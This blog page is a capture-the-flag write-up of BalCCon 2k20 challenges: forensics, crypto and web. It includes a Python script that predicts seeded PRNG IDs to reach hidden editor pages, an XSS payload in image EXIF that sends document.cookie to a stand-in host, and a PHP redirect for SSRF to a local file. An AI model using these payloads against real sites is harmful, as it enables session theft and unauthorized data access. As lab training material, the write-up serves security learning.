@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    
+    
+    <title>BalCCon 2k20 CTF Write Up | Ajdin&#39;s blog</title>
+</head>
+<body>
+        <main><div>
+    <a class="nav-item link-fix" href="/">Ajdin&#39;s blog</a>
+    
+    <a class="nav-item link-fix" href="/about">About</a>
+    
+    <a class="nav-item link-fix" href="/cv/cv.pdf">CV</a>
+    
+    <a class="nav-item link-fix" href="/tags">Tags</a>
+    
+    <a class="nav-item link-fix" href="https://github.com/ajdintrejic">Github</a>
+    
+    <a class="nav-item link-fix" href="/index.xml">RSS</a>
+    
+</div>
+
+<div id="content">
+<br/>
+<h2>BalCCon 2k20 CTF Write Up</h2>
+
+
+
+<span class="date">[2020-09-20]</span>
+
+
+
+<p>================================</p>
+<p><img src="/ctf-balccon-2020/6.png" alt="">
+This is a BalCCon 2k20 Write Up by imm0rtals</p>
+<h2 id="forensicspatience">forensics/Patience</h2>
+<blockquote>
+<p>Strange&hellip; Everything looks the same. But there is some message hidden, I am sure!</p>
+</blockquote>
+<p>We are given a .pcap file and if we look at the duration
+<img src="/ctf-balccon-2020/7.png" alt=""></p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt; <span style="color:#fff;font-weight:bold">for</span> i in durs:
+...     <span style="color:#fff;font-weight:bold">if</span> i &lt; <span style="color:#ff0;font-weight:bold">0.20</span>:
+...             morse +=<span style="color:#0ff;font-weight:bold">&#39;.&#39;</span>
+...     <span style="color:#fff;font-weight:bold">elif</span> i &gt; <span style="color:#ff0;font-weight:bold">0.5</span> and i &lt; <span style="color:#ff0;font-weight:bold">1</span>:
+...             morse +=<span style="color:#0ff;font-weight:bold">&#39;-&#39;</span>
+...     <span style="color:#fff;font-weight:bold">else</span>:
+...             morse +=<span style="color:#0ff;font-weight:bold">&#39; &#39;</span>
+... 
+&gt;&gt;&gt; morse
+<span style="color:#0ff;font-weight:bold">&#39;-... -.-. - ..-.  -.-. --- ...- . .-. -  - .. -- .. -. --.  -.-. .... .- -. -. . .-..  .- - - .- -.-. -.-  .- -  -.. .- .-- -.  .&#39;</span>
+</code></pre></div><pre><code>BCTF{COVERT_TIMING_CHANNEL_ATTACK_AT_DAWN}
+</code></pre><hr>
+<h2 id="welcomemy-glass-is-empty">welcome/My glass is empty?</h2>
+<blockquote>
+<p>Let&rsquo;s change that and hang out with us in IRC :)</p>
+</blockquote>
+<p>Connect to #balccon2k20-ctf IRC and get the flag</p>
+<pre><code>BCTF{pour_me_one_more_rakija}
+</code></pre><hr>
+<h2 id="cryptoslang-back">crypto/Slang Back</h2>
+<blockquote>
+<p>These youngsters speak some weird language. Does it make any sense at all?!</p>
+</blockquote>
+<pre><code>}ejnsergazaku_ejnevazakilu_ejndejazanu_ejnibazou_ib_ejnizaztovu_ejnumazekizu_zeb{ejnbazftcu
+</code></pre><p>Reverse it</p>
+<pre><code>uctfzabnje{bez_uzikezamunje_uvotzazinje_bi_uozabinje_unazajednje_ulikazavenje_ukazagresnje}
+</code></pre><p>Remove &ldquo;u&rdquo;, &ldquo;za&rdquo; and &ldquo;nje&rdquo;</p>
+<pre><code>ctfb{bez_zikemu_votzi_bi_obi_najed_likave_kagres}
+</code></pre><p>Move some letters arround to create proper Serbian words (Remember this CTF was hosted in Serbia?):</p>
+<ul>
+<li>ctfb -&gt; bctf</li>
+<li>zikemu -&gt; muzike (music)</li>
+<li>votzi -&gt; zivot (life)</li>
+<li>obi -&gt; bio (would be)</li>
+<li>najed -&gt; jedna (one)</li>
+<li>likave -&gt; velika (big)</li>
+<li>kagres -&gt; greska (mistake)</li>
+</ul>
+<pre><code>BCTF{bez_muzike_zivot_bi_bio_jedna_velika_greska}
+</code></pre><p>Which translates to:</p>
+<blockquote>
+<p>Without music life would be one big mistake</p>
+</blockquote>
+<hr>
+<h2 id="cryptotwice-cooler">crypto/Twice Cooler</h2>
+<blockquote>
+<p>We received the message which resembles some very familiar encoding&hellip; But not exactly it.</p>
+</blockquote>
+<p>The message has almost 40000 characters, just base32 decode over and over and you get:</p>
+<pre><code>BCTF{base32_is_c00ler_than_base64_s0meh0w}
+</code></pre><hr>
+<h2 id="webnavajo">web/Navajo</h2>
+<blockquote>
+<p>What is the status of Navajo tribes nowadays?</p>
+</blockquote>
+<p>Open <code>https://navajo.pwn.institute/server-status</code> and check logs (note: you might have to wait if the log request is not there)</p>
+<p><img src="/ctf-balccon-2020/1.png" alt=""></p>
+<pre><code>BCTF{extremely_secret_url_no_one_can_guess}
+</code></pre><hr>
+<h2 id="webtwo-sides-of-a-coin">web/Two Sides of a Coin</h2>
+<blockquote>
+<p>Bulletin Board where you can buy or sell cool stuff. Check it out: <a href="https://two-sides-of-a-coin.pwn.institute">https://two-sides-of-a-coin.pwn.institute</a></p>
+</blockquote>
+<p>CTF challege provides us with app.py:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007f7f">#!/usr/bin/env python3</span>
+
+<span style="color:#fff;font-weight:bold">import</span> datetime
+<span style="color:#fff;font-weight:bold">import</span> os
+<span style="color:#fff;font-weight:bold">import</span> string
+<span style="color:#fff;font-weight:bold">import</span> random
+<span style="color:#fff;font-weight:bold">import</span> time
+
+<span style="color:#fff;font-weight:bold">import</span> sqlite3
+
+<span style="color:#fff;font-weight:bold">from</span> flask <span style="color:#fff;font-weight:bold">import</span> Flask, redirect, render_template, request, url_for
+
+READONLY = False
+<span style="color:#fff;font-weight:bold">if</span> os.getenv(<span style="color:#0ff;font-weight:bold">&#39;READONLY&#39;</span>):
+    READONLY = <span style="color:#fff;font-weight:bold">bool</span>(os.getenv(<span style="color:#0ff;font-weight:bold">&#39;READONLY&#39;</span>))
+
+
+app = Flask(__name__)
+
+@app.route(<span style="color:#0ff;font-weight:bold">&#39;/&#39;</span>)
+<span style="color:#fff;font-weight:bold">def</span> index():
+    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+    c = conn.cursor()
+    c.execute(<span style="color:#0ff;font-weight:bold">&#39;SELECT id_viewer, title FROM board&#39;</span>)
+
+    data = []
+    <span style="color:#fff;font-weight:bold">for</span> item in c.fetchall():
+        data.append({
+            <span style="color:#0ff;font-weight:bold">&#39;id&#39;</span>: item[<span style="color:#ff0;font-weight:bold">0</span>],
+            <span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>: item[<span style="color:#ff0;font-weight:bold">1</span>],
+        })
+    conn.close()
+
+    <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;index.html&#39;</span>, data=data, readonly=READONLY)
+
+
+<span style="color:#fff;font-weight:bold">def</span> get_random_id():
+    alphabet = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_lowercase + string.digits)
+
+    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>.join([random.choice(alphabet) <span style="color:#fff;font-weight:bold">for</span> _ in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">32</span>)])
+
+
+@app.route(<span style="color:#0ff;font-weight:bold">&#39;/add&#39;</span>, methods=[<span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;POST&#39;</span>])
+<span style="color:#fff;font-weight:bold">def</span> add():
+    <span style="color:#fff;font-weight:bold">if</span> READONLY:
+        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;Sorry, new advertisements are temporarily not allowed.&#39;</span>
+
+    <span style="color:#fff;font-weight:bold">if</span> request.method == <span style="color:#0ff;font-weight:bold">&#39;GET&#39;</span>:
+        <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;add.html&#39;</span>)
+
+    posted_at = <span style="color:#fff;font-weight:bold">round</span>(time.time(), <span style="color:#ff0;font-weight:bold">4</span>)
+    random.seed(posted_at)
+    id_viewer = get_random_id()
+    id_editor = get_random_id()
+
+    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+    c = conn.cursor()
+    params = (id_viewer, id_editor, posted_at, request.form[<span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>], request.form[<span style="color:#0ff;font-weight:bold">&#39;text&#39;</span>], request.form[<span style="color:#0ff;font-weight:bold">&#39;text_extra&#39;</span>])
+    c.execute(<span style="color:#0ff;font-weight:bold">&#39;INSERT INTO board VALUES (?, ?, ?, ?, ?, ?)&#39;</span>, params)
+    conn.commit()
+    conn.close()
+
+    <span style="color:#fff;font-weight:bold">return</span> redirect(<span style="color:#0ff;font-weight:bold">&#39;/view/&#39;</span> + id_editor)
+
+
+@app.route(<span style="color:#0ff;font-weight:bold">&#39;/view/&lt;_id&gt;&#39;</span>)
+<span style="color:#fff;font-weight:bold">def</span> view(_id):
+    conn = sqlite3.connect(<span style="color:#0ff;font-weight:bold">&#39;board.db&#39;</span>)
+    c = conn.cursor()
+    params = (_id, _id)
+    c.execute(<span style="color:#0ff;font-weight:bold">&#39;SELECT id_viewer, id_editor, posted_at, title, text_viewer, text_editor FROM board WHERE id_viewer = ? OR id_editor = ? LIMIT 1&#39;</span>, params)
+    data = c.fetchone()
+
+    <span style="color:#fff;font-weight:bold">if</span> not data:
+        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;Advertisement not found.&#39;</span>, <span style="color:#ff0;font-weight:bold">404</span>
+
+    <span style="color:#007f7f"># extra notes for editor</span>
+    is_editor = (data[<span style="color:#ff0;font-weight:bold">1</span>] == _id)
+    text_extra = None
+    url_viewer = None
+
+    <span style="color:#fff;font-weight:bold">if</span> is_editor:
+        text_extra = data[<span style="color:#ff0;font-weight:bold">5</span>]
+        url_viewer = url_for(<span style="color:#0ff;font-weight:bold">&#39;view&#39;</span>, _id=data[<span style="color:#ff0;font-weight:bold">0</span>])
+
+    data = {
+        <span style="color:#0ff;font-weight:bold">&#39;posted_at&#39;</span>: datetime.datetime.fromtimestamp(data[<span style="color:#ff0;font-weight:bold">2</span>], tz=datetime.timezone.utc).strftime(<span style="color:#0ff;font-weight:bold">&#39;%Y-%m-</span><span style="color:#0ff;font-weight:bold">%d</span><span style="color:#0ff;font-weight:bold"> %H:%M UTC&#39;</span>),
+        <span style="color:#0ff;font-weight:bold">&#39;title&#39;</span>: data[<span style="color:#ff0;font-weight:bold">3</span>],
+        <span style="color:#0ff;font-weight:bold">&#39;text&#39;</span>: data[<span style="color:#ff0;font-weight:bold">4</span>],
+        <span style="color:#0ff;font-weight:bold">&#39;text_extra&#39;</span>: text_extra,
+        <span style="color:#0ff;font-weight:bold">&#39;url_viewer&#39;</span>: url_viewer,
+    }
+    conn.close()
+
+    <span style="color:#fff;font-weight:bold">return</span> render_template(<span style="color:#0ff;font-weight:bold">&#39;view.html&#39;</span>, data=data)
+
+
+<span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span>:
+    app.run(host=<span style="color:#0ff;font-weight:bold">&#39;0.0.0.0&#39;</span>, port=<span style="color:#ff0;font-weight:bold">5002</span>)
+
+</code></pre></div><p>The random number generation in not actually random. The script which extracts the flag:</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> random
+<span style="color:#fff;font-weight:bold">import</span> string
+<span style="color:#fff;font-weight:bold">import</span> time
+<span style="color:#fff;font-weight:bold">import</span> calendar
+<span style="color:#fff;font-weight:bold">import</span> requests
+<span style="color:#fff;font-weight:bold">import</span> argparse
+<span style="color:#fff;font-weight:bold">import</span> bs4
+<span style="color:#fff;font-weight:bold">import</span> itertools
+
+<span style="color:#fff;font-weight:bold">def</span> get_random_id():
+    alphabet = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_lowercase + string.digits)
+    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#39;&#39;</span>.join([random.choice(alphabet) <span style="color:#fff;font-weight:bold">for</span> _ in <span style="color:#fff;font-weight:bold">range</span>(<span style="color:#ff0;font-weight:bold">32</span>)])
+
+<span style="color:#fff;font-weight:bold">def</span> frange(start,stop,step):
+  <span style="color:#fff;font-weight:bold">if</span> step == <span style="color:#ff0;font-weight:bold">0</span>:
+    <span style="color:#fff;font-weight:bold">raise</span> ValueError(<span style="color:#0ff;font-weight:bold">&#34;Step must not be 0&#34;</span>)
+  sample_count = <span style="color:#fff;font-weight:bold">int</span>(<span style="color:#fff;font-weight:bold">abs</span>(stop-start) / step)
+  <span style="color:#fff;font-weight:bold">return</span> itertools.islice(itertools.count(start,step),sample_count)
+
+<span style="color:#fff;font-weight:bold">def</span> check_id(view_id):
+  r = requests.get(host + <span style="color:#0ff;font-weight:bold">&#34;view/&#34;</span> + view_id) 
+  soup = bs4.BeautifulSoup(r.text, <span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
+  tm = soup.font.text[<span style="color:#ff0;font-weight:bold">10</span>:]
+  t = time.strptime(tm,<span style="color:#0ff;font-weight:bold">&#34;%Y-%m-</span><span style="color:#0ff;font-weight:bold">%d</span><span style="color:#0ff;font-weight:bold"> %H:%M %Z&#34;</span>)
+  <span style="color:#fff;font-weight:bold">for</span> i in frange(<span style="color:#ff0;font-weight:bold">0</span>,<span style="color:#ff0;font-weight:bold">60</span>,<span style="color:#ff0;font-weight:bold">0.0001</span>):
+    time_value = <span style="color:#fff;font-weight:bold">round</span>(calendar.timegm(t),<span style="color:#ff0;font-weight:bold">4</span>)+i
+    random.seed(time_value)
+    test_seed_id = get_random_id()
+    <span style="color:#fff;font-weight:bold">if</span> test_seed_id == view_id:
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Viewing id found at {:04f}&#39;s past time : {}&#34;</span>.format(i,test_seed_id))
+      editing_id = get_random_id()
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Editing id found : {}&#34;</span>.format(editing_id))
+      r = requests.get(host + <span style="color:#0ff;font-weight:bold">&#34;view/&#34;</span> + editing_id)
+      soup = bs4.BeautifulSoup(r.text, <span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Title: {}&#34;</span>.format(soup.h1.text.rstrip()))
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Regular viewing: {}&#34;</span>.format(soup.find_all(<span style="color:#0ff;font-weight:bold">&#39;p&#39;</span>)[<span style="color:#ff0;font-weight:bold">0</span>].text.rstrip()))
+      <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Editorial viewing: {}&#34;</span>.format(soup.find_all(<span style="color:#0ff;font-weight:bold">&#39;p&#39;</span>)[<span style="color:#ff0;font-weight:bold">1</span>].text.rstrip()))
+      <span style="color:#fff;font-weight:bold">break</span>
+
+
+parser = argparse.ArgumentParser(description=<span style="color:#0ff;font-weight:bold">&#39;Solve bulletin board challenge&#39;</span>)
+parser.add_argument(<span style="color:#0ff;font-weight:bold">&#39;--host&#39;</span>)
+args = parser.parse_args()
+
+host = args.host
+r = requests.get(host)
+bs = bs4.BeautifulSoup(r.text,<span style="color:#0ff;font-weight:bold">&#39;html.parser&#39;</span>)
+<span style="color:#fff;font-weight:bold">for</span> viewing_id in bs.find_all(<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>):
+  check_id(viewing_id[<span style="color:#0ff;font-weight:bold">&#39;href&#39;</span>][<span style="color:#ff0;font-weight:bold">6</span>:])
+</code></pre></div><p>And the flag is:</p>
+<pre><code>BCTF{numb3rs_from_PRNG_are_n0t_really_rand0m}
+</code></pre><hr>
+<h2 id="webimgr">web/Imgr</h2>
+<blockquote>
+<p>Look at this nice new Social Media application. You can only view your own profile, since it is still in the very early development phase, but it is the up and coming social networking platform. P.S. If you see something strange, let developers know! <a href="https://imgr.pwn.institute">https://imgr.pwn.institute</a></p>
+</blockquote>
+<p><img src="/ctf-balccon-2020/2.png" alt=""></p>
+<p>After creating an account and logging in we can see an endpoint in the source code called <code>/imageinfo</code></p>
+<p><img src="/ctf-balccon-2020/3.png" alt=""></p>
+<p>Editing the picture exif data we can inject XSS and send that url to the devs.</p>
+<p>XSS payload:</p>
+<pre><code>&lt;script&gt;new Image().src='https://example.com/?c=%27+document.cookie&lt;/script&gt;
+</code></pre><p>Flag:</p>
+<pre><code>flag=BCTF{n3v3r_pUbl15h_Unf1n15h3d_p4ge5}
+</code></pre><hr>
+<h2 id="weblet-me-see">web/Let Me See</h2>
+<blockquote>
+<p>This service lets you see the source code of your website: <a href="https://let-me-see.pwn.institute">https://let-me-see.pwn.institute</a></p>
+</blockquote>
+<p><img src="/ctf-balccon-2020/4.png" alt=""></p>
+<p>This is a SSRF challenge, host this file:</p>
+<pre><code>&lt;?php
+header(&quot;Location: file://flag.txt&quot;);
+?&gt;
+</code></pre><p>and open it with the app:</p>
+<pre><code>BCTF{tricky_curl_redirect_to_file_protocol}
+</code></pre>
+
+
+
+
+            </div><div class="footer">
+    <p>================================</p>
+    <p> > Copyright 2021 Ajdin Trejic</p>
+</div>
+</main>
+    </body>
+</html>
